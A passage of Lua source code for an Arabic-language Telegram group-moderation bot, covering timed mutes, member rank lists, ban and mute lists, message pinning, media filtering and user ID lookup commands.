Dev_Feras(msg.chat_id_, msg.id_, 1, '⌁︙العضو ↫ ['..absc9..']\n⌁︙تم تقييده لمدة ↫ '..mutept[1]..' د', 1, 'md')
DevFeras:sadd(DevFeras..'bot:mutet:'..msg.chat_id_,result.sender_user_id_) end end 
if tonumber(msg.reply_to_message_id_) == 0 then else
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, mut_time,nil) end end
if text and text:match('^تقييد ساعه (%d+)$') and ChCheck(msg) then 
local function mut_time(extra, result,success)
local mutept = {string.match(text, "^تقييد ساعه (%d+)$")}
local hour = string.gsub(mutept[1], 'h', '')
local num1 = tonumber(hour) * 3600 
local num = tonumber(num1)
local user_info_ = DevFeras:get(DevFeras..'user:Name' .. result.sender_user_id_)
local absc9 = user_info_ if user_info_ then end 
if tonumber(result.sender_user_id_) == tonumber(bot_id) then  
Dev_Feras(msg.chat_id_, msg.id_, 1, '⌁︙*لا تستطيع تقييدي*', 1, 'md')
return false end 
if Admin(result.sender_user_id_, msg.chat_id_) then 
Dev_Feras(msg.chat_id_, msg.id_, 1, '⌁︙لا تستطيع تقييد ↫ '..rank_abs(result.sender_user_id_, msg.chat_id_), 1, 'md') else 
MuteTime(msg.chat_id_,result.sender_user_id_,msg.date_+num1) 
Dev_Feras(msg.chat_id_, msg.id_, 1, '⌁︙العضو ↫ ['..absc9..']\n⌁︙تم تقييده لمدة ↫ '..mutept[1]..' س', 1, 'md')
DevFeras:sadd(DevFeras..'bot:mutet:'..msg.chat_id_,result.sender_user_id_) end end
if tonumber(msg.reply_to_message_id_) == 0 then else
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, mut_time,nil) end end 
if text and text:match('^تقييد يوم (%d+)$') and ChCheck(msg) then 
local function mut_time(extra, result,success)
local mutept = {string.match(text, "^تقييد يوم (%d+)$")}
local day = string.gsub(mutept[1], 'd', '')
local num1 = tonumber(day) * 86400 
local num = tonumber(num1)
local user_info_ = DevFeras:get(DevFeras..'user:Name' .. result.sender_user_id_)
local absc9 = user_info_ if user_info_ then end 
if tonumber(result.sender_user_id_) == tonumber(bot_id) then  
Dev_Feras(msg.chat_id_, msg.id_, 1, '⌁︙*لا تستطيع تقييدي*', 1, 'md')
return false end 
if Admin(result.sender_user_id_, msg.chat_id_) then 
Dev_Feras(msg.chat_id_, msg.id_, 1, '⌁︙لا تستطيع تقييد ↫ '..rank_abs(result.sender_user_id_, msg.chat_id_), 1, 'md') else 
MuteTime(msg.chat_id_,result.sender_user_id_,msg.date_+num1) 
Dev_Feras(msg.chat_id_, msg.id_, 1, '⌁︙العضو ↫ ['..absc9..']\n⌁︙تم تقييده لمدة ↫ '..mutept[1]..' ي', 1, 'md')
DevFeras:sadd(DevFeras..'bot:mutet:'..msg.chat_id_,result.sender_user_id_) end end
if tonumber(msg.reply_to_message_id_) == 0 then else
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, mut_time,nil) end end 
--     Source DevFeras     --
if text and text:match("^اضف رسائل (%d+)$") and msg.reply_to_message_id_ == 0 and ChCheck(msg) then  
if MonshId(msg.sender_user_id_, msg.chat_id_) then
TXT = text:match("^اضف رسائل (%d+)$")
DevFeras:set('Feras_dev:'..bot_id..'id:user'..msg.chat_id_,TXT)  
DevFeras:setex('Feras_dev:'..bot_id.."numadd:user" .. msg.chat_id_ .. "" .. msg.sender_user_id_, 300, true)  
Dev_Feras(msg.chat_id_, msg.id_, 1, "⌁︙ارسل عدد الرسائل الان \n⌁︙ارسل الغاء لالغاء الامر ", 1, "md")
Dev_Feras(msg.chat_id_, msg.id_, 1,numd, 1, 'md') 
else 
Dev_Feras(msg.chat_id_, msg.id_, 1, '⌁︙هذا الامر للمنشئين فقط', 1, 'md') 
end 
end 
if text and text:match("^اضف رسائل (%d+)$") and msg.reply_to_message_id_ ~= 0 and MonshId(msg.sender_user_id_, msg.chat_id_) then
local Num = text:match("^اضف رسائل (%d+)$")
function reply(extra, result, success)
DevFeras:del(DevFeras..'user:msgs'..msg.chat_id_..':'..result.sender_user_id_) 
DevFeras:incrby(DevFeras..'user:msgs'..msg.chat_id_..':'..result.sender_user_id_,Num) 
Dev_Feras(msg.chat_id_, msg.id_, 1, "⌁︙تم اضافة "..Num..' رساله', 1, 'md') 
end
tdcli_function ({ID = "GetMessage",chat_id_=msg.chat_id_,message_id_=tonumber(msg.reply_to_message_id_)},reply, nil)
return false
end
if text and text:match("^اضف نقاط (%d+)$") and msg.reply_to_message_id_ == 0 and ChCheck(msg) then  
if MonshId(msg.sender_user_id_, msg.chat_id_) then
TXT = text:match("^اضف نقاط (%d+)$")
DevFeras:set('Feras_dev:'..bot_id..'ids:user'..msg.chat_id_,TXT)  
DevFeras:setex('Feras_dev:'..bot_id.."nmadd:user" .. msg.chat_id_ .. "" .. msg.sender_user_id_, 300, true)  
Dev_Feras(msg.chat_id_, msg.id_, 1, "⌁︙ارسل عدد النقاط الان \n⌁︙ارسل الغاء لالغاء الامر ", 1, "md")
Dev_Feras(msg.chat_id_, msg.id_, 1,numd, 1, 'md') 
else 
Dev_Feras(msg.chat_id_, msg.id_, 1, '⌁︙هذا الامر للمنشئين فقط', 1, 'md') 
end 
end 
if text and text:match("^اضف نقاط (%d+)$") and msg.reply_to_message_id_ ~= 0 and MonshId(msg.sender_user_id_, msg.chat_id_) then
local Num = text:match("^اضف نقاط (%d+)$")
function reply(extra, result, success)
DevFeras:incrby(DevFeras..'bot:add:num'..msg.chat_id_..result.sender_user_id_,Num) 
Dev_Feras(msg.chat_id_, msg.id_, 1, "⌁︙تم اضافة "..Num..' نقطه', 1, 'md') 
end
tdcli_function ({ID = "GetMessage",chat_id_=msg.chat_id_,message_id_=tonumber(msg.reply_to_message_id_)},reply, nil)
return false
end
if DevFeras:get(DevFeras..'bot:Del:Abs'..msg.chat_id_) then if msg.content_.video_ or msg.content_.document_ or msg.content_.sticker_ or msg.content_.photo_ or msg.content_.animation_ then if msg.reply_to_message_id_ ~= 0 then DevFeras:sadd(DevFeras.."abs:cleaner"..msg.chat_id_, msg.id_) else DevFeras:sadd(DevFeras.."abs:cleaner"..msg.chat_id_, msg.id_) end end end
if Owner(msg.sender_user_id_, msg.chat_id_) and msg.reply_to_message_id_ ~= 0 then
if text and text:match("^تثبيت$") and ChCheck(msg) then 
if DevFeras:sismember(DevFeras.."bot:pin:mutepin",msg.chat_id_) and not Monsh(msg.sender_user_id_, msg.chat_id_) then
Dev_Feras(msg.chat_id_,msg.id_, 1, "⌁︙التثبيت والغاء واعادة التثبيت تم قفله من قبل المنشئين الاساسيين", 1, 'md')
return false  
end
tdcli_function ({ID = "PinChannelMessage",channel_id_ = msg.chat_id_:gsub("-100",""),message_id_ = msg.reply_to_message_id_,disable_notification_ = 1},function(arg,data) 
if data.ID == "Ok" then
pin(msg.chat_id_,msg.reply_to_message_id_,1)
DevFeras:set(DevFeras..'pinnedmsg'..msg.chat_id_,msg.reply_to_message_id_)
local Feras_dev = '⌁︙اهلا عزيزي ↫ '..abs_rank(msg)..' \n⌁︙تم تثبيت الرساله بنجاح'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, Feras_dev, 14, string.len(msg.sender_user_id_))
return false  
end
if data.code_ == 6 then
Dev_Feras(msg.chat_id_, msg.id_, 1,'⌁︙البوت ليس ادمن هنا !', 1, 'md')
return false  
end
if data.message_ == "CHAT_ADMIN_REQUIRED" then
Dev_Feras(msg.chat_id_, msg.id_, 1,'⌁︙ليست لدي صلاحية التثبيت !', 1, 'md')
return false  
end
end,nil)
end 
end
--     Source DevFeras     --
if Admin(msg.sender_user_id_, msg.chat_id_) then
if text == "المميزين" and ChCheck(msg) then 
local list = DevFeras:smembers(DevFeras..'abs:vipmem:'..msg.chat_id_)
text = "⌁︙قائمة المميزين ↫ ⤈ \n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\n"
for k,v in pairs(list) do
local username = DevFeras:get(DevFeras..'Save:UserName'..v)
if username then
text = text..""..k.."~ : [@"..username.."]\n"
else
text = text..""..k.."~ : `"..v.."`\n"
end end
if #list == 0 then 
text = "⌁︙*لا يوجد مميزين*"
end
Dev_Feras(msg.chat_id_, msg.id_, 1, text, 1, "md")
end end 
--     Source DevFeras     --
if Owner(msg.sender_user_id_, msg.chat_id_) then
if text == "الادمنيه" and ChCheck(msg) or text == "الادمنية" and ChCheck(msg) then 
local abs =  'abs:admins:'..msg.chat_id_
local list = DevFeras:smembers(DevFeras..abs)
text = "⌁︙قائمة الادمنيه ↫ ⤈ \n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\n"
for k,v in pairs(list) do
local username = DevFeras:get(DevFeras..'Save:UserName'..v)
if username then
text = text..""..k.."~ : [@"..username.."]\n"
else
text = text..""..k.."~ : `"..v.."`\n"
end end
if #list == 0 then
text = "⌁︙*لا يوجد ادمنيه*"
end
Dev_Feras(msg.chat_id_, msg.id_, 1, text, 1, "md")
end end
--     Source DevFeras     -- 
if MonshId(msg.sender_user_id_, msg.chat_id_) then
if text == "المدراء" and ChCheck(msg) or text == "مدراء" and ChCheck(msg) then 
local list = DevFeras:smembers(DevFeras..'abs:owners:'..msg.chat_id_)
text = "⌁︙قائمة المدراء ↫ ⤈ \n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\n"
for k,v in pairs(list) do
local username = DevFeras:get(DevFeras..'Save:UserName'..v)
if username then
text = text..""..k.."~ : [@"..username.."]\n"
else
text = text..""..k.."~ : `"..v.."`\n"
end end
if #list == 0 then 
text = "⌁︙*لا يوجد مدراء*"
end
Dev_Feras(msg.chat_id_, msg.id_, 1, text, 1, "md")
end 
if text == "المنظفين" and ChCheck(msg) then 
local list = DevFeras:smembers(DevFeras..'abs:Cleaner:'..msg.chat_id_)
text = "⌁︙قائمة المنظفين ↫ ⤈ \n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\n"
for k,v in pairs(list) do
local username = DevFeras:get(DevFeras..'Save:UserName'..v)
if username then
text = text..""..k.."~ : [@"..username.."]\n"
else
text = text..""..k.."~ : `"..v.."`\n"
end end
if #list == 0 then 
text = "⌁︙*لا يوجد منظفين*"
end
Dev_Feras(msg.chat_id_, msg.id_, 1, text, 1, "md")
end end 
--     Source DevFeras     --
if Monsh(msg.sender_user_id_, msg.chat_id_) then
if text == "المنشئين" and ChCheck(msg) then 
local list = DevFeras:smembers(DevFeras..'abs:monshid:'..msg.chat_id_)
text = "⌁︙قائمة المنشئين ↫ ⤈ \n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\n"
for k,v in pairs(list) do
local username = DevFeras:get(DevFeras..'Save:UserName'..v)
if username then
text = text..""..k.."~ : [@"..username.."]\n"
else
text = text..""..k.."~ : `"..v.."`\n"
end end
if #list == 0 then 
text = "⌁︙*لا يوجد منشئين*"
end
Dev_Feras(msg.chat_id_, msg.id_, 1, text, 1, "md")
end end 
--     Source DevFeras     --
if AbsMonsh(msg.sender_user_id_, msg.chat_id_) then
if text == "المنشئين الاساسيين" and ChCheck(msg) or text == "منشئين اساسيين" and ChCheck(msg) or text == "المنشئين الاساسين" and ChCheck(msg) then 
local list = DevFeras:smembers(DevFeras..'abs:monsh:'..msg.chat_id_)
text = "⌁︙قائمة المنشئين الاساسيين ↫ ⤈ \n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\n"
for k,v in pairs(list) do
local username = DevFeras:get(DevFeras..'Save:UserName'..v)
if username then
text = text..""..k.."~ : [@"..username.."]\n"
else
text = text..""..k.."~ : `"..v.."`\n"
end end
if #list == 0 then 
text = "⌁︙*لا يوجد منشئين اساسيين*"
end
Dev_Feras(msg.chat_id_, msg.id_, 1, text, 1, "md")
end 
end 
if text ==("المنشئ") and ChCheck(msg) or text ==("المالك") and ChCheck(msg) then
tdcli_function ({ID = "GetChannelMembers",channel_id_ = msg.chat_id_:gsub("-100",""),filter_ = {ID = "ChannelMembersAdministrators"},offset_ = 0,limit_ = 100},function(arg,data) 
local admins = data.members_
for i=0 , #admins do
if data.members_[i].status_.ID == "ChatMemberStatusCreator" then
owner_id = admins[i].user_id_
tdcli_function ({ID = "GetUser",user_id_ = owner_id},function(arg,dp) 
if dp.first_name_ == false then
Dev_Feras(msg.chat_id_, msg.id_, 1, "⌁︙حساب المنشئ محذوف", 1, "md")
return false  
end
local UserName = (dp.username_ or "Dev_Prox")
Dev_Feras(msg.chat_id_, msg.id_, 1, "⌁︙منشئ المجموعه ↫ ["..dp.first_name_.."](T.me/"..UserName..")", 1, "md")  
end,nil)   
end
end
end,nil)   
end
--     Source DevFeras     --
if Admin(msg.sender_user_id_, msg.chat_id_) then
if text == "المكتومين" and ChCheck(msg) then 
local list = DevFeras:smembers(DevFeras..'abs:Muted:'..msg.chat_id_)
text = "⌁︙قائمة المكتومين ↫ ⤈ \n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\n"
for k,v in pairs(list) do
local username = DevFeras:get(DevFeras..'Save:UserName'..v)
if username then
text = text..""..k.."~ : [@"..username.."]\n"
else
text = text..""..k.."~ : `"..v.."`\n"
end end
if #list == 0 then 
text = "⌁︙*لا يوجد مكتومين*"
end
Dev_Feras(msg.chat_id_, msg.id_, 1, text, 1, "md")
end 
--     Source DevFeras     --
if text == "المقيدين" and ChCheck(msg) then 
local list = DevFeras:smembers(DevFeras..'abs:Tkeed:'..msg.chat_id_)
text = "⌁︙قائمة المقيدين ↫ ⤈ \n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\n"
for k,v in pairs(list) do
local username = DevFeras:get(DevFeras..'Save:UserName'..v)
if username then
text = text..""..k.."~ : [@"..username.."]\n"
else
text = text..""..k.."~ : `"..v.."`\n"
end end
if #list == 0 then
text = "⌁︙*لا يوجد مقيدين*"
end
Dev_Feras(msg.chat_id_, msg.id_, 1, text, 1, "md")
end 
--     Source DevFeras     --
if text == "المحظورين" and ChCheck(msg) or text == "المحضورين" and ChCheck(msg) then 
local list = DevFeras:smembers(DevFeras..'abs:Ban:'..msg.chat_id_)
text = "⌁︙قائمة المحظورين ↫ ⤈ \n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\n"
for k,v in pairs(list) do
local username = DevFeras:get(DevFeras..'Save:UserName'..v)
if username then
text = text..""..k.."~ : [@"..username.."]\n"
else
text = text..""..k.."~ : `"..v.."`\n"
end end
if #list == 0 then 
text = "⌁︙*لا يوجد محظورين*"
end
Dev_Feras(msg.chat_id_, msg.id_, 1, text, 1, "md")
end 
end 
--     Source DevFeras     --
if text == "المطايه" and ChCheck(msg) or text == "المطاية" and ChCheck(msg) then
local list = DevFeras:smembers(DevFeras..'bot:donky:'..msg.chat_id_)
text = "⌁︙قائمة مطاية المجموعه 😹💔 ↫ ⤈ \n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\n"
for k,v in pairs(list) do
local username = DevFeras:get(DevFeras..'Save:UserName'..v)
if username then
text = text..""..k.."~ : [@"..username.."]\n"
else
text = text..""..k.."~ : `"..v.."`\n"
end end
if #list == 0 then
text = "⌁︙*لا يوجد مطايه كلها اوادم* 😹💔"
end
Dev_Feras(msg.chat_id_, msg.id_, 1, text, 1, "md")
end
--     Source DevFeras     --
if SudoBot(msg.sender_user_id_, msg.chat_id_) then
if text == "قائمه العام" and ChCheck(msg) or text == "المحظورين عام" and ChCheck(msg) or text == "المكتومين عام" and ChCheck(msg) or text == "↫ قائمه العام ⌁" and ChCheck(msg) then 
local BanAll = DevFeras:smembers(DevFeras..'abs:BanAll:')
local MuteAll = DevFeras:smembers(DevFeras..'abs:MuteAll:')
if #BanAll ~= 0 then 
text = "⌁︙قائمة المحظورين عام ↫ ⤈ \n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\n"
for k,v in pairs(BanAll) do
local username = DevFeras:get(DevFeras..'Save:UserName'..v)
if username then
text = text..""..k.."~ : [@"..username.."]\n"
else
text = text..""..k.."~ : `"..v.."`\n"
end end
else
text = ""
end
if #MuteAll ~= 0 then 
text = text.."⌁︙قائمة المكتومين عام ↫ ⤈ \n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\n"
for k,v in pairs(MuteAll) do
local username = DevFeras:get(DevFeras..'Save:UserName'..v)
if username then
text = text..""..k.."~ : [@"..username.."]\n"
else
text = text..""..k.."~ : `"..v.."`\n"
end end
else
text = text
end
if #BanAll ~= 0 or #MuteAll ~= 0 then 
text = text
else
text = "⌁︙*لم يتم حظر او كتم اي عضو*"
end
Dev_Feras(msg.chat_id_, msg.id_, 1, text, 1, "md")
end 
--     Source DevFeras     --
if text == "المطورين" and ChCheck(msg) or text == "↫ المطورين ⌁" and ChCheck(msg) then 
local list = DevFeras:smembers(DevFeras..'abs:SudoBot:')
text = "⌁︙قائمة المطورين ↫ ⤈ \n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\n"
for k,v in pairs(list) do
local sudouser = DevFeras:get(DevFeras..'abs:Sudos'..v) 
local username = DevFeras:get(DevFeras..'Save:UserName'..v)
if username then
text = text..""..k.."~ : [@"..username.."] ↬ Gps : "..(sudouser or 0).."\n"
else
text = text..""..k.."~ : `"..v.."` ↬ Gps : "..(sudouser or 0).."\n"
end end
if #list == 0 then
text = "⌁︙*عذرا لم يتم رفع اي مطورين*"
end
Dev_Feras(msg.chat_id_, msg.id_, 1, text, 1, "md")
end 
--     Source DevFeras     --
if text == "المدراء العامين" and ChCheck(msg) then 
local list = DevFeras:smembers(DevFeras..'abs:ownerall:')
text = "⌁︙قائمة المدراء العامين ↫ ⤈ \n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\n"
for k,v in pairs(list) do
local username = DevFeras:get(DevFeras..'Save:UserName'..v)
if username then
text = text..""..k.."~ : [@"..username.."]\n"
else
text = text..""..k.."~ : `"..v.."`\n"
end end
if #list == 0 then 
text = "⌁︙*لا يوجد مدراء عامين*"
end
Dev_Feras(msg.chat_id_, msg.id_, 1, text, 1, "md")
end
--     Source DevFeras     --
if text == "المميزين عام" and ChCheck(msg) or text == "المميزين العامين" and ChCheck(msg) then 
local list = DevFeras:smembers(DevFeras..'abs:vipall:')
text = "⌁︙قائمة المميزين العام ↫ ⤈ \n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\n"
for k,v in pairs(list) do
local username = DevFeras:get(DevFeras..'Save:UserName'..v)
if username then
text = text..""..k.."~ : [@"..username.."]\n"
else
text = text..""..k.."~ : `"..v.."`\n"
end end
if #list == 0 then 
text = "⌁︙*لا يوجد مميزين عام*"
end
Dev_Feras(msg.chat_id_, msg.id_, 1, text, 1, "md")
end 
--     Source DevFeras     -- 
if text == "الادمنيه العامين" and ChCheck(msg) then 
local abs =  'abs:adminall:'
local list = DevFeras:smembers(DevFeras..abs)
text = "⌁︙قائمة الادمنيه العامين ↫ ⤈ \n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\n"
for k,v in pairs(list) do
local username = DevFeras:get(DevFeras..'Save:UserName'..v)
if username then
text = text..""..k.."~ : [@"..username.."]\n"
else
text = text..""..k.."~ : `"..v.."`\n"
end end
if #list == 0 then
text = "⌁︙*لا يوجد ادمنيه عامين*"
end
Dev_Feras(msg.chat_id_, msg.id_, 1, text, 1, "md")
end  
--     Source DevFeras     --
if text ==("رفع المنشئ") and ChCheck(msg) or text ==("رفع المنشئ") and ChCheck(msg) then 
tdcli_function ({ID = "GetChannelMembers",channel_id_ = msg.chat_id_:gsub("-100",""),filter_ = {ID = "ChannelMembersAdministrators"},offset_ = 0,limit_ = 100},function(arg,data) 
DevFeras:del(DevFeras..'abs:absmonsh:'..msg.chat_id_)
local admins = data.members_
for i=0 , #admins do
if data.members_[i].status_.ID == "ChatMemberStatusCreator" then
owner_id = admins[i].user_id_
end
end
tdcli_function ({ID = "GetUser",user_id_ = owner_id},function(arg,dp) 
if dp.first_name_ == false then
Dev_Feras(msg.chat_id_, msg.id_, 1, "⌁︙حساب المنشئ محذوف", 1, "md")
return false  
end
local UserName = (dp.username_ or "Dev_Prox")
Dev_Feras(msg.chat_id_, msg.id_, 1, "⌁︙تم رفع منشئ المجموعه ↫ ["..dp.first_name_.."](T.me/"..UserName..")", 1, "md") 
DevFeras:sadd(DevFeras.."abs:absmonsh:"..msg.chat_id_,dp.id_)
end,nil)   
end,nil)   
end
end 
--     Source DevFeras     --
if text and text:match("^ضع دعم$") and Sudo(msg) then
Dev_Feras(msg.chat_id_, msg.id_, 1, "️⌁︙ارسل رابط الكروب او معرف الدعم \n⌁︙ليتواصل معك المتابعين من خلاله ", 1, "md")
DevFeras:setex(DevFeras.."bot:support:link" .. msg.sender_user_id_, 120, true)
end
if text and text:match("^حذف دعم$") and Sudo(msg) then
Dev_Feras(msg.chat_id_, msg.id_, 1, "⌁︙تم حذف معلومات الدعم ", 1, "md")
DevFeras:del(DevFeras.."bot:supports:link")
end
end 
--     Source DevFeras     --
if Owner(msg.sender_user_id_, msg.chat_id_) then
if text == 'منع' and tonumber(msg.reply_to_message_id_) > 0 and ChCheck(msg) then 
function filter_by_reply(extra, result, success) 
if result.content_.sticker_ then
local idsticker = result.content_.sticker_.sticker_.persistent_id_
DevFeras:sadd(DevFeras.."filtersteckr"..msg.chat_id_,idsticker)
Dev_Feras(msg.chat_id_, msg.id_, 1, '⌁︙تم منع الملصق بنجاح لن يتم ارساله مجددا', 1, 'md')
return false
end
if result.content_.ID == "MessagePhoto" then
local photo = result.content_.photo_.id_
DevFeras:sadd(DevFeras.."filterphoto"..msg.chat_id_,photo)
Dev_Feras(msg.chat_id_, msg.id_, 1, '⌁︙تم منع الصوره بنجاح لن يتم ارسالها مجددا', 1, 'md')
return false
end
if result.content_.animation_ then
local idanimation = result.content_.animation_.animation_.persistent_id_
DevFeras:sadd(DevFeras.."filteranimation"..msg.chat_id_,idanimation)
Dev_Feras(msg.chat_id_, msg.id_, 1, '⌁︙تم منع المتحركه بنجاح لن يتم ارسالها مجددا', 1, 'md')
return false
end
end
getMessage(msg.chat_id_, msg.reply_to_message_id_,filter_by_reply) 
end
--     Source DevFeras     --
if text == 'الغاء منع' and tonumber(msg.reply_to_message_id_) > 0 and ChCheck(msg) then     
function unfilter_by_reply(extra, result, success) 
if result.content_.sticker_ then
local idsticker = result.content_.sticker_.sticker_.persistent_id_
DevFeras:srem(DevFeras.."filtersteckr"..msg.chat_id_,idsticker)
Dev_Feras(msg.chat_id_, msg.id_, 1, '⌁︙تم الغاء منع الملصق يمكنهم ارساله الان', 1, 'md')
return false
end
if result.content_.ID == "MessagePhoto" then
local photo = result.content_.photo_.id_
DevFeras:srem(DevFeras.."filterphoto"..msg.chat_id_,photo)
Dev_Feras(msg.chat_id_, msg.id_, 1, '⌁︙تم الغاء منع الصوره يمكنهم ارسالها الان', 1, 'md')
return false
end
if result.content_.animation_.animation_ then
local idanimation = result.content_.animation_.animation_.persistent_id_
DevFeras:srem(DevFeras.."filteranimation"..msg.chat_id_,idanimation)
Dev_Feras(msg.chat_id_, msg.id_, 1, '⌁︙تم الغاء منع المتحركه يمكنهم ارسالها الان', 1, 'md')
return false
end
end
getMessage(msg.chat_id_, msg.reply_to_message_id_,unfilter_by_reply) 
end
end
--     Source DevFeras     --
if text ==("كشف") and msg.reply_to_message_id_ ~= 0 and ChCheck(msg) or text ==("ايدي") and msg.reply_to_message_id_ ~= 0 and ChCheck(msg) then 
function id_by_reply(extra, result, success) 
if tonumber(result.sender_user_id_) == tonumber(1419573259) then
t = 'مبرمج السورس'
elseif tonumber(result.sender_user_id_) == tonumber(bot_id) then
t = 'هذا البوت'
elseif tonumber(result.sender_user_id_) == tonumber(DevId) then
t = 'مطور اساسي'
elseif DevFeras:sismember(DevFeras..'abs:SudoBot:',result.sender_user_id_) then
t = DevFeras:get(DevFeras.."abs:SudoBot:Rd"..msg.chat_id_) or 'مطور البوت'
elseif DevFeras:sismember(DevFeras..'abs:absmonsh:'..msg.chat_id_,result.sender_user_id_) then
t = 'منشئ المجموعه'
elseif DevFeras:sismember(DevFeras..'abs:monsh:'..msg.chat_id_,result.sender_user_id_) then
t = DevFeras:get(DevFeras.."abs:monsh:Rd"..msg.chat_id_) or 'منشئ اساسي'
elseif DevFeras:sismember(DevFeras..'abs:monshid:'..msg.chat_id_,result.sender_user_id_) then
t = DevFeras:get(DevFeras.."abs:monshid:Rd"..msg.chat_id_) or 'منشئ'
elseif DevFeras:sismember(DevFeras..'abs:owners:'..msg.chat_id_,result.sender_user_id_) then
t = DevFeras:get(DevFeras.."abs:owners:Rd"..msg.chat_id_) or 'مدير'
elseif DevFeras:sismember(DevFeras..'abs:admins:'..msg.chat_id_,result.sender_user_id_) then
t = DevFeras:get(DevFeras.."abs:admins:Rd"..msg.chat_id_) or 'ادمن'
elseif DevFeras:sismember(DevFeras..'abs:vipall:',result.sender_user_id_) then
t = DevFeras:get(DevFeras.."abs:vipmem:Rd"..msg.chat_id_) or 'مميز عام'
elseif DevFeras:sismember(DevFeras..'abs:ownerall:',result.sender_user_id_) then
t = DevFeras:get(DevFeras.."abs:owners:Rd"..msg.chat_id_) or 'نائب مدير'
elseif DevFeras:sismember(DevFeras..'abs:adminall:',result.sender_user_id_) then
t = DevFeras:get(DevFeras.."abs:admins:Rd"..msg.chat_id_) or 'ادمن عام'
elseif DevFeras:sismember(DevFeras..'abs:vipmem:'..msg.chat_id_,result.sender_user_id_) then
t = DevFeras:get(DevFeras.."abs:vipmem:Rd"..msg.chat_id_) or 'مميز'
elseif DevFeras:sismember(DevFeras..'abs:Cleaner:'..msg.chat_id_,result.sender_user_id_) then
t = DevFeras:get(DevFeras.."abs:Cleaner:Rd"..msg.chat_id_) or 'منظف'
else
t = DevFeras:get(DevFeras.."abs:mem:Rd"..msg.chat_id_) or 'عضو'
end
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
local user_msgs = DevFeras:get(DevFeras..'user:msgs'..msg.chat_id_..':'..data.id_) or 0
local user_nkt = tonumber(DevFeras:get(DevFeras..'bot:add:num'..msg.chat_id_..data.id_) or 0)
if DevFeras:sismember(DevFeras..'abs:BanAll:',result.sender_user_id_) then
Tkeed = 'محظور عام'
elseif DevFeras:sismember(DevFeras..'abs:MuteAll:',result.sender_user_id_) then
Tkeed = 'مكتوم عام'
elseif DevFeras:sismember(DevFeras..'abs:Ban:'..msg.chat_id_,result.sender_user_id_) then
Tkeed = 'محظور'
elseif DevFeras:sismember(DevFeras..'abs:Muted:'..msg.chat_id_,result.sender_user_id_) then
Tkeed = 'مكتوم'
elseif DevFeras:sismember(DevFeras..'abs:Tkeed:'..msg.chat_id_,result.sender_user_id_) then
Tkeed = 'مقيد'
else
Tkeed = 'لا يوجد'
end
if DevFeras:sismember(DevFeras..'abs:SudoBot:',result.sender_user_id_) then
sudobot = '\n⌁︙عدد القروبات ↫ '..(DevFeras:get(DevFeras..'abs:Sudos'..result.sender_user_id_) or 0)..'' 
else 
sudobot = '' 
end
if data.first_name_ == false then 
Dev_Feras(msg.chat_id_, msg.id_, 1,'⌁︙الحساب محذوف', 1, 'md')
return false  end
if data.username_ == false then
Text = '⌁︙اسمه ↫ ['..CatchName(data.first_name_,20)..'](tg://user?id='..result.sender_user_id_..')\n⌁︙ايديه ↫ ❨ `'..result.sender_user_id_..'` ❩\n⌁︙رتبته ↫ '..t..''..sudobot..'\n⌁︙رسائله ↫ ❨ '..user_msgs..' ❩\n⌁︙تفاعله ↫ '..formsgs(user_msgs)..'\n⌁︙نقاطه ↫ ❨ '..user_nkt..' ❩\n⌁︙القيود ↫ '..Tkeed
SendText(msg.chat_id_,Text,msg.id_/2097152/0.5,'md')
else
Dev_Feras(msg.chat_id_, msg.id_, 1,'⌁︙معرفه ↫ [@'..data.username_..']\n⌁︙ايديه ↫ ❨ `'..result.sender_user_id_..'` ❩\n⌁︙رتبته ↫ '..t..''..sudobot..'\n⌁︙رسائله ↫ ❨ '..user_msgs..' ❩\n⌁︙تفاعله ↫ '..formsgs(user_msgs)..'\n⌁︙نقاطه ↫ ❨ '..user_nkt..' ❩\n⌁︙القيود ↫ '..Tkeed, 1, 'md')
end
end,nil)
end 
getMessage(msg.chat_id_, msg.reply_to_message_id_,id_by_reply) 
end
if text and text:match('^كشف @(.*)') and ChCheck(msg) or text and text:match('^ايدي @(.*)') and ChCheck(msg) then 
local username = text:match('^كشف @(.*)') or text:match('^ايدي @(.*)')
tdcli_function ({ID = "SearchPublicChat",username_ = username},function(extra, res, success) 
if res and res.message_ and res.message_ == "USERNAME_NOT_OCCUPIED" then 
Dev_Feras(msg.chat_id_, msg.id_, 1,'⌁︙*المعرف غير صحيح*', 1, 'md')
return false  end
if res.type_.ID == "ChannelChatInfo" then 
if res.type_.channel_.is_supergroup_ == false then
local ch = 'قناة'
local chn = '⌁︙نوع الحساب ↫ ❨ '..ch..' ❩\n⌁︙الايدي ↫ ❨ `'..res.id_..'` ❩\n⌁︙المعرف ↫ ❨ [@'..username..'] ❩\n⌁︙الاسم ↫ ❨ ['..res.title_..'] ❩'
Dev_Feras(msg.chat_id_, msg.id_, 1,chn, 1, 'md')
else
local gr = 'مجموعه'
local grr = '⌁︙نوع الحساب ↫ ❨ '..gr..' ❩\n⌁︙الايدي ↫ ❨ '..res.id_..' ❩\n⌁︙المعرف ↫ ❨ [@'..username..'] ❩\n⌁︙الاسم ↫ ❨ ['..res.title_..'] ❩'
Dev_Feras(msg.chat_id_, msg.id_, 1,grr, 1, 'md')
end
return false  end
if res.id_ then  
